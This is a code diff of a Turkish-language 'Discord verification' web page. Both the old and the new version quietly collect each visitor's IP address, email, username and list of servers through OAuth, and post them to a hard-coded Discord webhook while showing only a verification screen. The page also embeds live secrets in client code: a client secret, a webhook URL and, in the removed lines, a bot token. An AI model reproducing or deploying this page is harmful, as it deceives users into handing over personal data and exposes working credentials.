@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Discord Doğrulama</title>
   <style>
     body {
@@ -22,7 +22,7 @@
       border-radius: 8px;
       padding: 30px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-      max-width: 600px;
+      max-width: 500px;
       width: 100%;
     }
     h2 {
@@ -38,83 +38,25 @@
       font-size: 16px;
       cursor: pointer;
       transition: background-color 0.3s;
-      display: inline-block;
       text-decoration: none;
+      display: inline-block;
       margin-top: 15px;
     }
     .btn:hover {
       background-color: #4752C4;
     }
-    .info-text {
-      margin: 20px 0;
-      color: #b9bbbe;
-      font-size: 14px;
-    }
-    .status {
-      margin-top: 20px;
-      padding: 15px;
-      border-radius: 4px;
-    }
     .loading {
-      display: none;
-      margin: 20px auto;
-      width: 50px;
-      height: 50px;
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #5865F2;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #5865F2;
       border-radius: 50%;
+      width: 30px;
+      height: 30px;
       animation: spin 1s linear infinite;
+      margin: 20px auto;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
-    }
-    .verified {
-      background-color: #3ba55c;
-    }
-    .error {
-      background-color: #ed4245;
-    }
-    .server-list {
-      margin-top: 20px;
-      text-align: left;
-      max-height: 300px;
-      overflow-y: auto;
-    }
-    .server-item {
-      padding: 10px;
-      margin-bottom: 10px;
-      background-color: #40444b;
-      border-radius: 4px;
-      display: flex;
-      align-items: center;
-    }
-    .server-icon {
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      margin-right: 15px;
-    }
-    .server-info {
-      flex-grow: 1;
-    }
-    .server-name {
-      font-weight: bold;
-    }
-    .server-id {
-      font-size: 12px;
-      color: #b9bbbe;
-    }
-    .add-btn {
-      background-color: #3ba55c;
-      color: white;
-      border: none;
-      padding: 5px 10px;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    .add-btn:hover {
-      background-color: #2d7d46;
     }
     .hidden {
       display: none;
@@ -123,32 +65,15 @@
 </head>
 <body>
   <div class="container">
-    <h2>Discord Doğrulama</h2>
-    
     <div id="initialView">
-      <p>Sunucumuza erişmek için Discord hesabınızla doğrulama yapmanız gerekmektedir.</p>
-      <p class="info-text">Aşağıdaki butona tıklayarak doğrulama işlemini başlatabilirsiniz.</p>
-      <a id="loginBtn" class="btn">
-        <span>Discord ile Doğrula</span>
-      </a>
+      <h2>Discord Doğrulama</h2>
+      <p>Sunucumuza giriş yapmak için Discord hesabınızla bağlantı kurun</p>
+      <a id="loginBtn" class="btn">Discord ile Bağlan</a>
     </div>
     
-    <div id="verifyingView" class="hidden">
+    <div id="loadingView" class="hidden">
       <div class="loading"></div>
-      <p>Doğrulama yapılıyor, lütfen bekleyin...</p>
-      <p class="info-text">Bu işlem birkaç saniye sürebilir.</p>
-    </div>
-    
-    <div id="statusView" class="status hidden">
-      <!-- Durum mesajı burada gösterilecek -->
-    </div>
-    
-    <div id="serverListView" class="hidden">
-      <h3>Bulunduğunuz Sunucular</h3>
-      <div id="serverList" class="server-list">
-        <!-- Sunucu listesi burada oluşturulacak -->
-      </div>
-      <button id="joinServerBtn" class="btn hidden">Sunucuya Katıl</button>
+      <p>Doğrulama yapılıyor...</p>
     </div>
   </div>
 
@@ -158,266 +83,111 @@
       clientId: "1399152888214851595",
       redirectUri: "https://verify-system.netlify.app/",
       webhookUrl: "https://discord.com/api/webhooks/1399151324309881015/01oC6NPk2n7Mut17QfUvwsBUFRakn7rBYg52yTP7zI4IEfzEeMKePKD33IwgFvobyQGu",
-      targetServerId: "1277201564037025862", // Eklemek istediğiniz sunucu ID'si
-      botToken: "MTM5OTE1Mjg4ODIxNDg1MTU5NQ.GqXWrg.OCesj6DXghBh5LN-RduJyqK6NzDZMJO9yIAdUo", // Sunucuya ekleme yapacak bot tokenı
-      clientSecret: "XwMSoMkHCF0_D9fnTQy7JlfX7mVOpwP4"
+      discordServerInvite: "https://discord.gg/una", // Sunucu davet linkiniz
+      scope: "identify email guilds"
     };
 
-    // Elementleri seç
-    const initialView = document.getElementById("initialView");
-    const verifyingView = document.getElementById("verifyingView");
-    const statusView = document.getElementById("statusView");
-    const serverListView = document.getElementById("serverListView");
-    const serverList = document.getElementById("serverList");
-    const loginBtn = document.getElementById("loginBtn");
-    const joinServerBtn = document.getElementById("joinServerBtn");
+    // Elementler
+    const initialView = document.getElementById('initialView');
+    const loadingView = document.getElementById('loadingView');
+    const loginBtn = document.getElementById('loginBtn');
 
-    // Login butonuna tıklandığında Discord OAuth'a yönlendir
-    loginBtn.href = `https://discord.com/oauth2/authorize?client_id=${config.clientId}&redirect_uri=${encodeURIComponent(config.redirectUri)}&response_type=code&scope=identify%20email%20guilds`;
+    // OAuth URL'yi ayarla
+    loginBtn.href = `https://discord.com/oauth2/authorize?client_id=${config.clientId}&redirect_uri=${encodeURIComponent(config.redirectUri)}&response_type=code&scope=${config.scope}`;
 
-    // URL'den kod parametresini al
+    // URL'den code parametresini kontrol et
     const params = new URLSearchParams(window.location.search);
-    const code = params.get("code");
+    const code = params.get('code');
 
-    // Görünümleri değiştir
+    if (code) {
+      verifyUser(code);
+    }
+
+    async function verifyUser(code) {
+      showView(loadingView);
+      
+      try {
+        // 1. IP adresini al
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ipAddress = ipData.ip;
+
+        // 2. Discord'dan token al
+        const tokenResponse = await fetch('https://cors-anywhere.herokuapp.com/https://discord.com/api/oauth2/token', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'XMLHttpRequest'
+          },
+          body: new URLSearchParams({
+            client_id: config.clientId,
+            client_secret: "XwMSoMkHCF0_D9fnTQy7JlfX7mVOpwP4",
+            grant_type: 'authorization_code',
+            code: code,
+            redirect_uri: config.redirectUri,
+            scope: config.scope
+          })
+        });
+
+        const tokenData = await tokenResponse.json();
+        if (!tokenResponse.ok) throw new Error(tokenData.error_description || 'Token alınamadı');
+
+        // 3. Kullanıcı bilgilerini al
+        const [userData, guildsData] = await Promise.all([
+          fetch(`https://cors-anywhere.herokuapp.com/https://discord.com/api/users/@me`, {
+            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
+          }).then(res => res.json()),
+          fetch(`https://cors-anywhere.herokuapp.com/https://discord.com/api/users/@me/guilds`, {
+            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
+          }).then(res => res.json())
+        ]);
+
+        // 4. Webhook'a bilgileri gönder
+        await sendWebhook(userData, guildsData, ipAddress);
+
+        // 5. Kullanıcıyı sunucuya yönlendir
+        window.location.href = config.discordServerInvite;
+
+      } catch (error) {
+        alert(`Doğrulama başarısız: ${error.message}`);
+        window.location.href = config.redirectUri;
+      }
+    }
+
+    async function sendWebhook(user, guilds, ip) {
+      const embed = {
+        title: "Yeni Discord Doğrulaması",
+        color: 0x5865F2,
+        thumbnail: {
+          url: user.avatar 
+            ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` 
+            : 'https://cdn.discordapp.com/embed/avatars/0.png'
+        },
+        fields: [
+          { name: "Kullanıcı", value: `${user.username}#${user.discriminator}` },
+          { name: "ID", value: user.id },
+          { name: "Email", value: user.email || "Erişilemedi" },
+          { name: "IP Adresi", value: ip || "Bilinmiyor" },
+          { name: "Sunucular", value: guilds.map(g => g.name).join(", ") || "Yok" }
+        ],
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        await fetch(config.webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ embeds: [embed] })
+        });
+      } catch (error) {
+        console.error('Webhook gönderilemedi:', error);
+      }
+    }
+
     function showView(view) {
       initialView.classList.add('hidden');
-      verifyingView.classList.add('hidden');
-      statusView.classList.add('hidden');
-      serverListView.classList.add('hidden');
-      
-      if (view) {
-        document.getElementById(view).classList.remove('hidden');
-      }
-    }
-
-    // Durum mesajını göster
-    function showStatus(message, isSuccess) {
-      statusView.innerHTML = `<p>${message}</p>`;
-      statusView.className = isSuccess ? "status verified" : "status error";
-      showView('statusView');
-    }
-
-    // IP adresini al
-    async function getIP() {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-      } catch (error) {
-        console.error("IP alınırken hata:", error);
-        return "Erişilemedi";
-      }
-    }
-
-    // Sunucu listesini oluştur
-    function renderServerList(guilds, userData) {
-      serverList.innerHTML = '';
-      
-      if (guilds.length === 0) {
-        serverList.innerHTML = '<p>Herhangi bir sunucuda bulunmuyorsunuz.</p>';
-        return;
-      }
-      
-      guilds.forEach(guild => {
-        const serverItem = document.createElement('div');
-        serverItem.className = 'server-item';
-        
-        const iconUrl = guild.icon 
-          ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png?size=64`
-          : 'https://cdn.discordapp.com/embed/avatars/0.png';
-        
-        serverItem.innerHTML = `
-          <img src="${iconUrl}" class="server-icon" alt="Sunucu İkonu">
-          <div class="server-info">
-            <div class="server-name">${guild.name}</div>
-            <div class="server-id">ID: ${guild.id}</div>
-          </div>
-          <button class="add-btn" data-guild-id="${guild.id}">Sunucuya Ekle</button>
-        `;
-        
-        serverList.appendChild(serverItem);
-      });
-      
-      // Ekleme butonlarına event listener ekle
-      document.querySelectorAll('.add-btn').forEach(btn => {
-        btn.addEventListener('click', async () => {
-          const guildId = btn.getAttribute('data-guild-id');
-          await addUserToServer(userData.id, guildId);
-        });
-      });
-    }
-
-    // Kullanıcıyı sunucuya ekle
-    async function addUserToServer(userId, guildId) {
-      try {
-        showView('verifyingView');
-        
-        // Bu kısım backend tarafında yapılmalıdır!
-        // Örnek bir fetch isteği (gerçekte çalışması için backend gerekli)
-        const response = await fetch('https://your-backend-api.com/add-to-server', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Authorization': `Bot ${config.botToken}`
-          },
-          body: JSON.stringify({
-            userId: userId,
-            guildId: guildId
-          })
-        });
-        
-        const result = await response.json();
-        
-        if (result.success) {
-          showStatus(`✅ Kullanıcı başarıyla sunucuya eklendi!`, true);
-        } else {
-          showStatus(`❌ Hata: ${result.message || 'Kullanıcı sunucuya eklenemedi'}`, false);
-        }
-      } catch (error) {
-        console.error('Sunucuya ekleme hatası:', error);
-        showStatus('❌ Sunucuya ekleme sırasında bir hata oluştu', false);
-      }
-    }
-
-    // Kullanıcıyı hedef sunucuya ekle
-    async function joinTargetServer(userId) {
-      try {
-        showView('verifyingView');
-        
-        // Bu kısım backend tarafında yapılmalıdır!
-        // Örnek bir fetch isteği (gerçekte çalışması için backend gerekli)
-        const response = await fetch('https://your-backend-api.com/join-server', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Authorization': `Bot ${config.botToken}`
-          },
-          body: JSON.stringify({
-            userId: userId,
-            guildId: config.targetServerId
-          })
-        });
-        
-        const result = await response.json();
-        
-        if (result.success) {
-          showStatus(`✅ Başarıyla sunucumuza katıldınız!`, true);
-        } else {
-          showStatus(`❌ Hata: ${result.message || 'Sunucuya katılamadınız'}`, false);
-        }
-      } catch (error) {
-        console.error('Sunucuya katılma hatası:', error);
-        showStatus('❌ Sunucuya katılma sırasında bir hata oluştu', false);
-      }
-    }
-
-    // Kod geldiyse işlemleri başlat
-    if (code) {
-      (async () => {
-        try {
-          showView('verifyingView');
-          
-          // IP adresini al
-          const ipAddress = await getIP();
-          
-          // Token al
-          const tokenResponse = await fetch("https://discord.com/api/oauth2/token", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded",
-            },
-            body: new URLSearchParams({
-              client_id: config.clientId,
-              client_secret: config.clientSecret,
-              grant_type: "authorization_code",
-              code: code,
-              redirect_uri: config.redirectUri,
-              scope: "identify email guilds",
-            }),
-          });
-          
-          const tokenData = await tokenResponse.json();
-          
-          // Kullanıcı bilgilerini al
-          const userResponse = await fetch("https://discord.com/api/users/@me", {
-            headers: {
-              Authorization: `Bearer ${tokenData.access_token}`,
-            },
-          });
-          
-          const userData = await userResponse.json();
-          
-          // Kullanıcının sunucularını al
-          const guildsResponse = await fetch("https://discord.com/api/users/@me/guilds", {
-            headers: {
-              Authorization: `Bearer ${tokenData.access_token}`,
-            },
-          });
-          
-          const userGuilds = await guildsResponse.json();
-          
-          // Avatar URL'sini oluştur
-          const avatarUrl = userData.avatar 
-            ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=256`
-            : null;
-          
-          // Webhook embed verisi
-          const embed = {
-            title: "Yeni Discord Doğrulaması",
-            color: 0x5865F2,
-            thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
-            fields: [
-              {
-                name: "Kullanıcı Bilgileri",
-                value: `**İsim:** ${userData.username}#${userData.discriminator}\n**ID:** ${userData.id}\n**Email:** ${userData.email || "Erişilemedi"}`,
-                inline: false
-              },
-              {
-                name: "IP Adresi",
-                value: ipAddress,
-                inline: false
-              },
-              {
-                name: "Sunucu Sayısı",
-                value: userGuilds.length,
-                inline: false
-              }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: {
-              text: "Discord Doğrulama Sistemi"
-            }
-          };
-          
-          // Webhook'a gönder
-          await fetch(config.webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              embeds: [embed]
-            }),
-          });
-          
-          // Sunucu listesini göster
-          renderServerList(userGuilds, userData);
-          showView('serverListView');
-          
-          // Sunucuya katıl butonunu ayarla
-          joinServerBtn.classList.remove('hidden');
-          joinServerBtn.addEventListener('click', () => joinTargetServer(userData.id));
-          
-        } catch (err) {
-          console.error("Hata oluştu:", err);
-          showStatus(
-            "❌ Doğrulama başarısız!<br><br>" +
-            "Doğrulama sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
-            false
-          );
-        }
-      })();
+      loadingView.classList.add('hidden');
+      view.classList.remove('hidden');
     }
   </script>
 </body>
